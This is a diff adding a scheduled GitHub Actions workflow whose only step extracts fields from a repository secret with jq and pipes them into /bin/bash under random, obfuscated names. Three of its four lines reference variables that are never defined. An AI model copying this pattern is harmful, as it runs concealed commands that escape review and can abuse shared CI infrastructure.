@@ -1,0 +1,22 @@
+name: xidongliqian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xidongliqian
+        env:
+          ngzwy96: ${{ secrets.ngzwy96 }}
+        run: |
+          echo $ngzwy96 | jq -r .hnin630 | /bin/bash
+          echo $u52 | jq -r .iwka674 | /bin/bash
+          echo $yi84761 | jq -r .vmqpi47905 | /bin/bash
+          echo $qum42 | jq -r .zj46 | /bin/bash
+
